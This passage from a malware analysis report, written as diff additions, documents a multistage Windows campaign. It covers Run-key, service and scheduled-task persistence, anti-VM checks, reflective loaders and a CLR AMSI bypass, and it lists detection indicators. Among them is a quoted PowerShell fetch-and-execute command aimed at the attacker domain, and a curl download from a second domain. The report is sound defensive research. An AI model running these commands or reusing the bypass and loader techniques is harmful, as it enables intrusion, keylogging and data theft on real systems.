+| `0x898` | `0x1001dd25` | `0x899`-`0x8af` | In-memory loader and CLR bridge group. Cases include raw buffer execution, PE-like reflective load paths, optional thread creation, CLR hosting via `mscoree.dll!CLRCreateInstance` and `v4.0.30319`, and the AMSI string-patch helper that locates `clr.dll` `.rdata` and replaces `amsi.dll` with a caller-supplied 8-character library name. Detailed loader evidence follows later in this section. |
+
+Run-key persistence has HKCU and HKLM variants:
+
+- `0x1003445d` decodes `Software\Microsoft\Windows\CurrentVersion\Run`, opens `HKEY_CURRENT_USER` (`0xffffffff80000001`) with access `0x2001f`, then writes a supplied UTF-16 value through `RegSetValueExW` as `REG_SZ` (`type 1`). `0x100010ed` reaches this helper from command ID `0x709`.
+- `0x10034fe9` uses the same decoded Run key under `HKEY_LOCAL_MACHINE` (`0xffffffff80000002`) with access `0x2011f`, then writes a `REG_SZ` value. `0x100010ed` reaches this helper from command ID `0x70a`.
+- `0x10034745` deletes an HKCU Run value through `RegDeleteValueW`. `0x100010ed` reaches this helper from command ID `0x70b`.
+- `0x100352d1` deletes an HKLM Run value through `RegDeleteValueW`. `0x100010ed` reaches this helper from command ID `0x70c`.
+
+The HKCU Run write helper chain is:
+
+```text
+0x1003445d -> 0x1004a7f1 -> RegOpenKeyExW wrapper at 0x10044cfd
+0x1003445d -> 0x1004ab7d -> 0x1004ab21 -> 0x1004a905 -> RegSetValueExW wrapper at 0x10044e15
+```
+
+Service installation is exposed through command ID `0x712` in `0x100010ed`. The service helper at `0x100363b1` opens the Service Control Manager with access `0xf003f`, chooses start type `2` or `3` from a parsed boolean flag, and calls `0x1004a035`. `0x1004a035` calls `CreateServiceW` with full service access `0xf01ff`, service type `0x10`, caller-supplied start type, error-control `1`, a caller-supplied binary path, and caller-supplied service/display strings. If creation succeeds, it sets the decoded `Service Description` through `ChangeServiceConfig2W`.
+
+`0x1004a449`, reached by the service path, configures service failure actions through `ChangeServiceConfig2W` info level `2`. The static structure contains three actions: restart after 60 seconds, restart after 120 seconds, then no action. The literal string `Service failed to start` is used in this service/failure-action path.
+
+The same `0x709`-`0x717` group contains additional persistence lifecycle helpers:
+
+| Command ID | Helper | Static behavior |
+|---|---|---|
+| `0x70d` | `0x10034a21` / `0x10034cdd` | HKCU Run-value query/check variants. Both decode `Software\Microsoft\Windows\CurrentVersion\Run` and open HKCU with read/query access; the two-argument path passes an additional parsed value into the check helper. |
+| `0x70e` | `0x100355ad` / `0x10035869` | HKLM Run-value query/check variants using the same decoded Run key. |
+| `0x70f` | `0x10035b75` | Startup-folder shortcut creation. It calls `SHGetFolderPathW` with CSIDL `7`, appends `<name>.lnk`, creates `CLSID_ShellLink`, uses `IID_IShellLinkW` and `IID_IPersistFile`, and saves a caller-supplied target/arguments into the shortcut. |
+| `0x710` | `0x100360a9` | Startup-folder shortcut deletion. It builds the same Startup `*.lnk` path and calls `DeleteFileW`. |
+| `0x711` | `0x10036225` | Startup-folder shortcut presence check through `GetFileAttributesW`. |
+| `0x713` | `0x100365d9` | Service deletion. It opens SCM with access `0xf003f`, opens the caller-supplied service with `DELETE` access (`0x10000`), calls `DeleteService`, and closes service handles. |
+| `0x714` | `0x10036669` | Service presence/open check. It opens SCM with access `1`, opens the caller-supplied service with query-style access, then closes the handle. |
+| `0x715` | `0x10036871` | Scheduled-task creation/register path. It instantiates Task Scheduler through `CLSID_TaskScheduler` and `IID_ITaskService`, connects to the service, builds a task definition, configures task properties/triggers/actions, and registers the task. Decoded task-related strings include `PT0S`, `PT03S`, and `USERDOMAIN`. |
+| `0x716` | `0x10038545` | Scheduled-task deletion. It instantiates Task Scheduler, connects, gets the task folder, and calls the `ITaskFolder::DeleteTask` vtable slot for the supplied task name. |
+| `0x717` | `0x10038a81` | Scheduled-task inspection/check. It connects to Task Scheduler, gets a registered task, walks its definition/action objects, and compares recovered task/action data with caller-supplied values. |
+
+Task Scheduler method names were cross-checked against Wine's GitHub-hosted `taskschd.idl` method ordering:
+
+- `https://github.com/wine-mirror/wine/blob/master/include/taskschd.idl`
+
+The VM/service check at `0x1003184d` opens `HKLM\SYSTEM\CurrentControlSet\Services`, enumerates service subkeys through the `RegEnumKeyExW` wrapper at `0x10046619`, compares service names against VMware, VirtualBox, Hyper-V, QEMU, Xen, and Parallels markers, and writes a numeric class to `param+0x14` when a marker is matched.
+
+The CPUID-based VM check at `0x10031365` queries hypervisor CPUID leaf `0x40000000`, builds the vendor string, compares it to known hypervisor IDs, and writes a numeric class to `param+0x14`. Decoded vendor strings:
+
+```text
+VMwareVMware
+VBoxVBoxVBox
+KVMKVMKVM   
+XenVMMXenVMM
+Microsoft Hv
+ prl hyperv 
+```
+
+Ghidra's anti-analysis scan also flagged an `RDTSC` instruction in `0x1004af51`; static review shows that helper returns a value in a caller-supplied integer range and is used by string/container helpers. Current interpretation: the CPUID path is anti-VM logic; the RDTSC helper is not yet evidence of timing anti-analysis.
+
+The `0x898` dispatcher group at `0x1001dd25` covers command IDs `0x899` through `0x8af`. This group includes native in-memory loader variants and hosted CLR loader variants. r2 identifies this as a large switch function, about 7.6 KB with 51 basic blocks and 1,259 instructions. The native loader helpers use `VirtualAlloc` (`0x10047429`), `VirtualProtect` (`0x100474b9`), and `CreateThread` (`0x100448a5`). Several helpers parse PE-like headers and section tables: they read fields such as `e_lfanew` at `+0x3c`, walk section entries with a `0x28` stride, copy headers/sections into allocated memory, adjust section protections, and then optionally start execution.
+
+Qualification: the individual `0x899`-to-`0x8af` labels below are a working static reconstruction from recovered case bodies, helper-call multiplicities, and decompiler/r2 control flow. The raw jump-table bytes are not directly present as initialized bytes in the carved blob, so the table should be treated as command-gated capability mapping rather than proof that every listed capability ran.
+
+Observed `0x1001dd25` case map:
+
+| Command ID | Main helper | Static behavior |
+|---|---|---|
+| `0x899`, `0x89a` | `0x100161b5` | Raw-buffer execution. Allocates `(len / 0x1000 + 2) * 0x1000` bytes with `VirtualAlloc(..., 0x3000, 0x40)`, zeroes the caller length, copies the caller-supplied buffer, then either calls the buffer directly or starts it with `CreateThread`. |
+| `0x89b`-`0x8a2`, `0x8ae` | `0x1001719d` | Native PE-like reflective loader variants. The cases feed different parsed flags/fields into the same mapper. |
+| `0x8a3`, `0x8a8` | `0x10018edd` | Hosted CLR loader variants. |
+| `0x8a4`, `0x8a5` | `0x1001c105` -> `0x1001c171` | Module/section-assisted loader variants. The lower helper decodes `ntdll.dll` and `NtOpenSection`, installs a vectored exception handler, resolves the native API, performs setup through `0x1001c531`, loads a module path from parsed state, computes an entry pointer as `loaded_module_base + context_offset_0x50`, and then either calls that pointer or starts it with `CreateThread`. |
+| `0x8a6` | `0x10015bf1` | Native PE-like loader variant with an additional caller-supplied export/name argument. It maps the image, applies section protections, optionally calls its entry with `(base, 1, 0)`, resolves an export-like address through `0x10040dbd`, and calls that address if present. |
+| `0x8a7` | `0x1001c105` -> `0x1001c171` | Related module/section-assisted loader variant using an expanded intermediate argument list before the same lower helper. |
+| `0x8a9` | `0x1001782d` | Hosted CLR loader with CLR AMSI string patching before loading managed code. |
+| `0x8aa`, `0x8ab` | `0x100162d1` | Native PE-like loader variants. They enumerate parsed image candidates, use decoded `.exe` as a filter token, pick an image with enough slack for the caller buffer, map it, place the caller bytes inside the image at a randomized aligned offset, adjust section protections, and optionally start the staged entry. |
+| `0x8ac`, `0x8ad` | `0x10016b4d` | Native PE-like loader variants closely related to `0x100162d1`; the decompiled flow is nearly identical but lacks the special section-protection override that forces one section to `0x40` in `0x100162d1`. |
+| `0x8af` | `0x10016951` | Raw-buffer staging path. It pads/aligns the supplied buffer, chooses a randomized offset after 0x10-byte alignment, copies the buffer into a larger allocation, changes the whole allocation to `PAGE_EXECUTE_READ` (`0x20`), and either calls the staged pointer or starts it with `CreateThread`. |
+
+The CLR loader path uses hosted .NET:
+
+- `0x100479d5` resolves and calls `mscoree.dll!CLRCreateInstance`.
+- `0x1001782d` and `0x10018edd` both perform a CLR meta-host/runtime-host flow using `v4.0.30319`, `CoInitializeEx`, CLR interface GUIDs, `SafeArray*`, BSTR, and VARIANT helpers.
+- `0x1001dd25` dispatches into both CLR load variants from separate command/field cases.
+
+`0x1001782d` also implements a CLR AMSI bypass. It decodes `clr.dll`, `.rdata`, `amsi.dll`, `fakeLib not equal 8 symbols`, and `WARNING`. It gets the loaded `clr.dll` module, locates its `.rdata` section, searches for the `amsi.dll` string, changes memory protection through the `VirtualProtect` wrapper at `0x100474b9`, and overwrites the string with a caller-supplied 8-character fake library name. If the fake library string is not exactly 8 characters, it shows the decoded warning text.
+
+### Decoded shellcode strings
+
+Bulk static recovery of stack-decoded strings produced these useful groups.
+
+Manual API resolution DLLs:
+
+```text
+user32.dll
+shell32.dll
+advapi32.dll
+ole32.dll
+imagehlp.dll
+wintrust.dll
+shlwapi.dll
+wtsapi32.dll
+iphlpapi.dll
+oleaut32.dll
+bcrypt.dll
+mscoree.dll
+userenv.dll
+winhttp.dll
+normaliz.dll
+dwmapi.dll
+d3d11.dll
+gdiplus.dll
+ws2_32.dll
+```
+
+AMSI/.NET and loader-related strings:
+
+```text
+amsi.dll
+mscoree.dll
+v4.0.30319
+ntdll.dll
+fakeLib not equal 8 symbols
+BypassExceptionHandler
+```
+
+VM and sandbox-related service strings:
+
+```text
+SYSTEM\CurrentControlSet\Services
+vmtools
+VMware Tools
+vmhgfs
+vmmouse
+vmrawdsk
+vmusbmouse
+VBoxGuest
+VBoxMouse
+VBoxSF
+VBoxVideo
+VBoxService
+vmicheartbeat
+vmickvpexchange
+vmicshutdown
+vmictimesync
+vmicvss
+vmbus
+QEMU-GA
+QemuFwCfg
+xenevtchn
+xennet
+xenvbd
+xenbus
+prl_strg
+prl_eth
+prl_fs
+prl_mouf
+```
+
+Persistence and environment strings:
+
+```text
+Software\Microsoft\Windows\CurrentVersion\Run
+Service Description
+D:(A;;FA;;;WD)
+winsta0\default
+USERDOMAIN
+PT0S
+PT03S
+```
+
+UI/window strings:
+
+```text
+Progman
+Shell_TrayWnd
+Static
+Arial
+LOADING...
+```
+
+The decoded body also contains a structured parser. `FUN_1005079d` initializes internal stores and calls `FUN_10050a81`, `FUN_10050d8d`, and `FUN_10025f95`. `FUN_10050a81` parses an object table under root field `16000`: it reads list field `0x3e83`, per-item value field `0x3e8a`, optional flag container `0x3e8b`, flag fields `0x3e8c`/`0x3e8d`, and then attaches nested entries from `FUN_10051215`. `FUN_10050d8d` parses a second command/function table from root field `0x3e80`: list field `0x3e84`, item ID field `0x3e94`, a remap list under `0x3e96` with index/value pairs `0x3e9a`/`0x3e9b`, and nested entries from `FUN_10051215`.
+
+`FUN_10051215` parses nested command entries. It reads a list from field `0x3e9e`, allocates `0x38`-byte entry records, and stores scalar fields from `0x3ea0` through `0x3ea5` at entry offsets `0`, `8`, `0x10`, `0x20`, `0x28`, and `0x30`. It also reads argument descriptors from field `0x3ea8`. Descriptor field `0x3eaa` selects the type, with observed type values `19000`, `0x4a39`, `0x4a3a`, `0x4a3c`, `0x4a3d`, and `0x4a3e`; the associated value fields are `0x3eab`, `0x3eac`, `0x3ead`, `0x3eaf`, and `0x3eb0`. This layout lines up with the dispatcher bridge: `entry+8` is used to resolve the group object, `entry+0x10` is the command ID, `entry+0x18` is the parsed argument list, `entry+0x20` affects post-dispatch handling, and `entry+0x28` stores the continuation key.
+
+Current interpretation: the decoded payload is a manually loaded x64 component with dynamic API resolution, VM/service checks, host/profile collection, UI/overlay helpers, persistence and loader command groups, and a storage-file discovery/parser path that feeds parsed entries into the master dispatcher. The exact config format, final C2 behavior, and data-theft target remain unresolved.
+
+## Related PDF / Meadow branch
+
+Separately, the `meadowcodex-analysis/stage2_decoded.js` artifact is an ActiveX/JScript-style branch. It is not yet tied to the EtherHiding chain above as a proven same-stage dependency.
+
+Observed behavior from the decoded script:
+
+- Calls `window.resizeTo(0,0)` and moves the window off-screen.
+- Creates `ActiveXObject("WScript.Shell")`.
+- Creates a random directory under `%LOCALAPPDATA%`.
+- Downloads `quietsummitworks[.]com/wo` with `curl -s -L`.
+- Saves it with a random `.pdf` filename.
+- Waits 3 seconds.
+- Extracts it with `tar -xf`.
+- Closes the window.
+
+Hash:
+
+```text
+e59269548d7d68b5e1aa9da998f46bf1cf14aea65ebc5094d242cd5d2612e7ca  meadowcodex-analysis/stage2_decoded.js
+```
+
+This branch should stay in the notes as related infrastructure or campaign-adjacent material until the linkage is stronger.
+
+## Detection and hunting notes
+
+Useful network indicators:
+
+- `new-blog.artlist[.]io`
+- `auth-code-check[.]info`
+- `auth-code-check[.]info/api.php`
+- `auth-code-check[.]info/7z`
+- `auth-code-check[.]info/<16-hex-ray>`
+- `auth-code-check[.]info/<16-hex-ray>?_=1`
+- `auth-code-check[.]info/<64-hex-archive-token>`
+- `auth-code-check[.]info/p/<64-hex-archive-token>`
+- `quietsummitworks[.]com/wo` (related Meadow branch)
+- `jadeworkshop[.]top/router/handler-asset.js` (observed earlier, not fully written into this chain yet)
+
+Useful inline JavaScript traits:
+
+- `atob(...)`
+- `Uint8Array(...)`
+- `charCodeAt(...) ^ <constant>`
+- `new TextDecoder().decode(...)`
+- `new Function(...)`
+
+Useful browser-side JSON-RPC traits:
+
+- `eth_call`
+- `"method":"eth_call"`
+- `0xb68d1809`
+- `0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2`
+- `/api.php?s=`
+
+Useful command-line and script fragments:
+
+- `powershell -w h`
+- `iex(irm 'auth-code-check.info/<ray>' -UseBasicParsing)`
+- `WinHttp.WinHttpRequest.5.1`
+- `Start-Sleep -Seconds 20`
+- `7z x -y -pArsen33`
+- `GetFiles($nd,'fdupdate.exe','AllDirectories')`
+- `Start-Process -FilePath $fp`
+
+Useful file indicators:
+
+- `fdupdate.zip`
+- `fdupdate.exe`
+- `fdcadkernel.dll`
+- `fdunderkernel.dll`
+- `LibBind.dll`
+- `MUITransferX64.dll`
+- `TBFVSS_DLL_SRV_64.dll`
+- `Stream.Toolkit.dat`
+- `Stream.Toolkit.dat` carved slice at offset `0x4c26a`, length `0x533a3`
+- `Face.dat`, validated as the custom storage file parsed by the decoded payload
+
+Useful decoded shellcode traits:
+
+- XOR key `0xe5` over `0x533a3` bytes from `Stream.Toolkit.dat`
+- `Face.dat` validator magic/key `0x1b51b9fd`
+- `Face.dat` decoded record count `1178`, table/payload split at `0x19568`, total size `0x7a3b2e`
+- `Face.dat` record-payload transform through `0x1004b73d`: per-record XOR stream using metadata byte `+0x23`
+- `Face.dat` record `4`, tag `16001`, decoded UTF-16 script/config, SHA-256 `629518befad5153a2e8352e30f6a5169bac2c17329497678d5686cf15a0aacc9`
+- `Face.dat` record `1168`, tag `16100`, decoded PE32+ x64 payload `act.exe`, SHA-256 `75d4b6cec5bdc40cda25b5b9be136ccca97d77843825796beace7ddbfe87b614`
+- Embedded script loads `@input` through `previewer::load_exe`
+- Embedded script uses autorun value `FEM Update Model Manager` for both `registryAutorunValue` and `shedulerAutorunValue`
+- Decoded `act.exe` embeds AES-256-CBC encrypted ZIP data at VA `0x00443270`, file offset `0x42670`, length `0x592340`
+- `act.exe` AES key seed string: `36D6111FE68AE52A7B9E2095280EECAC`
+- `act.exe` encrypted blob SHA-256 `72e4ecdbd5bfc150f9f43b8d9e04a07408f5da3bccda9c5080616c63d0f6067d`
+- Decrypted inner ZIP SHA-256 `87892ebf77e8a33a3423ec3272d269116f7c6de58c3c29bed71c2ae46de3f228`
+- Decompressed raw x64 code SHA-256 `06157c24ed9ad3b2a639ca901deac6a29c26861ab5f6da31093247eadec9139a`
+- Raw x64 stage resolves `kernel32.dll` APIs through PEB walk at `0x180000bb9`, export resolver `0x18000092c`, and CRC-32-like hash helper `0x180000af4`
+- Raw x64 resolver table at `0x1800008ec`: `GetProcAddress`, `GetModuleHandleA`, `LoadLibraryA`, `VirtualAlloc`, and `RtlAddFunctionTable`
+- Raw x64 stage decodes an embedded PE from offset `0xc48`, length `0x873c00`, using byte mask `0x43 ^ (i & 0xff)`
+- Raw x64 manual-map helpers: copy headers/sections `0x180000380`, resolve imports `0x180000402`, apply `DIR64` relocations `0x180000522`, register unwind metadata `0x180000272`, execute TLS callbacks `0x1800002e1`, get entry point `0x180000252`
+- Raw x64 decoded PE SHA-256 `8035b177ca682962fd6501228ebd460ef174183ac08a87d81514bba3ecfd9502`
+- Raw x64 decoded PE exports `dbkFCallWrapperAddr`, `__dbk_fcall_wrapper`, `TMethodImplementationIntercept`, and `s`; reported/export library name `bad.dll`
+- Raw x64 decoded PE entry `0x00b4e670` reaches startup helper `0x00b4d900`; export `s` at `0x00b4e590` can trigger worker `0x00b4e380`
+- Raw x64 decoded PE worker `0x00b4e380` has service-dispatcher, helper/exit, and hidden-window/message-loop branches; the hidden window allows `WM_COPYDATA` and hides with `ShowWindow(0)`
+- Raw x64 decoded PE has xref-backed keylogging (`SetWindowsHookExW`), clipboard collection, desktop/video capture, outbound TCP socket, service-install, registry-write, certificate/PFX export, and remote-process-memory/thread-context-injection capability
+- `VirtualAlloc` size `0x208000`
+- `VirtualProtect(..., 0x20, ...)`
+- `EnumTimeFormatsEx` callback execution
+- Stack-decoded strings using seed `0x7ba56675fa291565`
+- VM service strings such as `VBoxGuest`, `vmtools`, `QEMU-GA`, `xenbus`, and `prl_eth`
+- `amsi.dll`, `mscoree.dll`, `v4.0.30319`
+- `Software\Microsoft\Windows\CurrentVersion\Run`
+- Startup-folder `.lnk` creation/deletion/check paths via `SHGetFolderPathW`, `CLSID_ShellLink`, `IID_IShellLinkW`, and `IID_IPersistFile`
+- Task Scheduler COM persistence via `CLSID_TaskScheduler`, `IID_ITaskService`, task registration/deletion/check paths, and strings `PT0S`, `PT03S`, `USERDOMAIN`
+- Anti-analysis probes for hypervisor CPUID vendors, virtualization service names, foreground-window churn, screen metrics, and IP traffic deltas
+- Timer-queue primitives through `CreateTimerQueue`, `CreateTimerQueueTimer`, `DeleteTimerQueueTimer`, and `ChangeTimerQueueTimer`
+- Known-folder and temp-path resolution through `SHGetKnownFolderPath` and `GetTempPathW`
+- Internal object tags `0x5209`, `0x520a`, and `0x520b` for list/numeric-list/byte-buffer-like containers
+- Native in-memory loader variants using `VirtualAlloc`, `VirtualProtect`, PE section-table parsing, and optional `CreateThread`
+- File-extension targets: `bak`, `db`, `bin`, `dat`, `raw`, `pak`
+
+## Open questions
+
+1. Beyond `LibBind.dll` process attach and the observed `renderengine.dll::CommonRenderModule::DrawBillBoardPrinterImpl` imported call at `0x18003b3c5`, is there any dynamically constructed or ordinal-only path to `group_by_u`? Static string/import review has not shown one yet.
+2. What are the exact per-case names for the still-broad command groups routed by `0x1000cc05`, especially the remaining interpreter primitives under `0x5dc` and the `0x898` loader cases where the jump-table bytes are not directly recoverable from the raw carve?
+3. What exact custom storage/object format is used by `Face.dat` beyond the now-mapped metadata fields, transform, and major tag families? The full semantic names for tags `16030`-`16054` still need naming.
+4. What exact control path activates each major capability in the PE decoded by the raw x64 stage at offset `0xc48`? Static evidence confirms keylogging, clipboard collection, screen/video capture, outbound TCP sockets, service persistence, certificate/PFX export, and remote-process-memory/thread-context injection, but the message/configuration path from the worker host to each module is not fully mapped.
+5. Does the raw x64 decoded PE contain final C2 URLs/domains, derive them at runtime, or receive them from local IPC/configuration or a later network stage? The TCP helper reads zero-initialized port/IP fields at `0x00c104a8` / `0x00c104ac`; no final endpoint is recovered yet.
+6. What static evidence explains the backend replay rules for `action=dl`, `action=cb`, `action=check`, archive fetch, and `/p/<token>`?
+7. Is the Meadow/`quietsummitworks[.]com` branch part of the same campaign, a parallel test, or a separate infection path?
+
+## Next analysis pass
+
+Use `rbinr2` and `rbinghidra` against:
+
+- `fdupdate.exe`
+- `fdcadkernel.dll`
+- `fdunderkernel.dll`
+- `LibBind.dll`
+- `MUITransferX64.dll`
+- `TBFVSS_DLL_SRV_64.dll`
+- `uv.dll`
+
+Priority tasks:
+
+- Continue static triage of the PE decoded by the raw x64 stage (`auth-code-check-analysis/raw_x64_decoded_pe_0xc48_0x873c00.bin`): finish the worker-path/control-message call graph from entry `0x00b4e670`, export `s` at `0x00b4e590`, startup helper `0x00b4d900`, worker `0x00b4e380`, and hidden-window procedure paths; then map keylogger, clipboard, socket, certificate/PFX, screenshot/video, service/registry, and remote-process-memory functions back to that graph.
+- Keep the raw x64 stage mapped as the decoder/manual mapper for that PE; verify the helper sequence around `0x180000380`, `0x180000402`, `0x180000522`, `0x180000272`, `0x1800002e1`, and `0x180000252` if manual-map details matter for publication.
+- Continue naming the `Face.dat` resource/object tags, especially `16030`-`16054`, now that the record metadata layout, transform, and PE-bearing branch are known.
+- Continue naming the structured parser fields around `0x3e80` through `0x3eb0` and map them back to `Face.dat` record tags in the `16000+` range.
+- Continue mapping command handlers under `0x1001dd25` and the remaining non-persistence groups routed by `0x1000cc05`, with `0x898` case labels treated as working reconstruction until the jump table source is recovered.
+- Continue checking for any dynamic or ordinal-only path that also reaches `LibBind.dll::group_by_u`, but current static evidence supports process attach plus the `renderengine.dll` imported call as the observed routes.
+- Separate signed third-party updater behavior from the malicious unsigned DLL and raw shellcode behavior.
+
+## Analysis process log
+
+This pass stayed static-only. No unknown binaries, scripts, shellcode, or extracted payloads were executed. Local scripts were used only to read bytes and replay arithmetic recovered from disassembly.
+
+- Main-thread tooling: `rabin2` import/export checks, r2 disassembly/decompilation, Ghidra MCP decompilation, local API-hash matching against `rbin/data/apidefs.json`, and small read-only Python arithmetic checks against `Face.dat` and `Stream.Toolkit.dat`.
+- Main-thread update: mapped `Face.dat` accessor/transform functions (`0x1004c189`, `0x1004c25d`, `0x1004c391`, `0x1004b88d`, `0x1004b73d`), decoded record `4` into UTF-16 script/config, decoded record `1168` into a PE32+ x64 executable, and decoded the `@input`, `registryAutorunValue`, and `shedulerAutorunValue` resource records.
+- Main-thread update: mapped decoded `act.exe` entry path to embedded CryptoAPI decryptor and ZIP unpacker, replayed AES-256-CBC/MD5 CryptoAPI decryption statically, extracted the inner LZMA ZIP member, and identified it as raw x64 position-independent code.
+- Main-thread update after compaction: mapped the raw x64 stage as a decoder/manual mapper for an embedded PE at raw offset `0xc48`, decoded length `0x873c00` with byte mask `0x43 ^ (i & 0xff)`, extracted `raw_x64_decoded_pe_0xc48_0x873c00.bin`, and recorded its PE metadata/import surface.
+- Main-thread update after compaction: mapped initial decoded PE startup and export behavior. Entry `0x00b4e670` reaches `0x00b4d900`; export `s` at `0x00b4e590` can call or thread worker `0x00b4e380`; the worker can enter `StartServiceCtrlDispatcherW`, a helper/exit branch, or a hidden-window/message-loop branch. Import-xref triage pinned concrete functions for remote-process memory (`0x00a18fb0`), PFX/certificate export (`0x00a7ea70`, `0x00973660`, `0x00974860`), screenshot capture (`0x007aa6d0`, `0x00b0a290`), service creation (`0x00a6bd90`), registry writes (`0x0079e850`), and socket call sites in the `0x00b0...` / `0x00b2...` ranges.
+- Sidecar agent `deep_worker` plus main-thread spot checks: confirmed the decoded PE is not just a benign initializer. Evidence now includes `SetWindowsHookExW(WH_KEYBOARD_LL=0x0d)` keylogging at `0x00b3a37c`-`0x00b3a390`, clipboard reads through `GetClipboardData(CF_UNICODETEXT/CF_TEXT)` at `0x00b385b0`, desktop/video capture through GDI and AVI APIs at `0x00b3c180`, TCP connect setup at `0x00b0b220` with static endpoint fields `0x00c104a8` / `0x00c104ac`, service-install and `svchost.exe -k LocalService` registry material at `0x00a6bd90` / `0x00a6c474` / `0x00a6c4b9`, and remote RWX allocation plus write/process-thread manipulation around `0x00a18fb0`, `0x00a19040`, and `0x00a196a0`.
+- Sidecar agent `deep_worker`: completed read-only static triage of the raw x64 stage, confirming PEB-based `kernel32.dll` resolution, CRC-32-like export hashing, the five-entry resolver table, reflective PE mapping, `DIR64` relocations, `RtlAddFunctionTable`, TLS callback execution, and `DllMain(module_base, DLL_PROCESS_ATTACH, NULL)` invocation. It also found no raw-loader evidence of C2, persistence, credential theft, remote-process injection, process launch, registry/task activity, or named mutex creation before the concealed PE is decoded.
+- Sidecar agent `fast_scan`: independently checked `0x10052a81`, confirmed `MODULEENTRY32W` layout (`0x438`, `szExePath` at `+0x230`), decoded extension blocks, and verified the `0x10053129` validator call convention.
+- Sidecar agent `deep_worker`: independently reviewed `0x898` loader behavior and `LibBind.dll` load paths, confirming process attach as an independent `group_by_u` trigger and `renderengine.dll` call `0x18003b3c5` as an additional trigger.
+- Sidecar agent `deep_worker`: independently confirmed the `Face.dat` metadata layout, read-transform algorithm, parser routing for tags `16000`/`16003`/`16004`/`16030`, and dispatcher-facing tag `16002 -> 16050 -> 16100` PE retrieval path.
+
+## Local artifact map
+
+Primary working directory:
+
+```text
+auth-code-check-analysis/
+```
+
+Important decoded files:
+
+```text
+auth-code-check-analysis/api_v29732886.decoded.js
+auth-code-check-analysis/api_v29732897.decoded.js
+auth-code-check-analysis/fresh_initial_https.decoded.ps1
+auth-code-check-analysis/fresh_final_stage.decoded.ps1
+auth-code-check-analysis/fresh_final_stage_inner.decoded.ps1
+```
+
+Recovered payload files:
+
+```text
+auth-code-check-analysis/fresh_tool_7z.bin
+auth-code-check-analysis/fresh_payload_archive.bin
+auth-code-check-analysis/fresh_payload_extracted/fdupdate/
+auth-code-check-analysis/stream_toolkit_carved_0x4c26a_0x533a3.bin
+auth-code-check-analysis/stream_toolkit_decoded_xor_e5.bin
+auth-code-check-analysis/face_record_4_tag_16001_decoded.bin
+auth-code-check-analysis/face_record_1168_tag_16100_decoded.bin
+auth-code-check-analysis/act_embedded_blob_0x443270_0x592340.enc.bin
+auth-code-check-analysis/act_embedded_blob_decrypted_aes256cbc_unpadded.bin
+auth-code-check-analysis/act_inner_zip_extracted/act_embedded_blob_decrypted_aes256cbc_unpadded
+auth-code-check-analysis/raw_x64_decoded_pe_0xc48_0x873c00.bin
+auth-code-check-analysis/stream_0x5dc_pdc.txt
+auth-code-check-analysis/stream_0x10052a81_pdc.txt
+auth-code-check-analysis/stream_0x10052a81_pdf.txt
+```
+
+Related branch:
+
+```text
+meadowcodex-analysis/stage2_decoded.js
+```
+
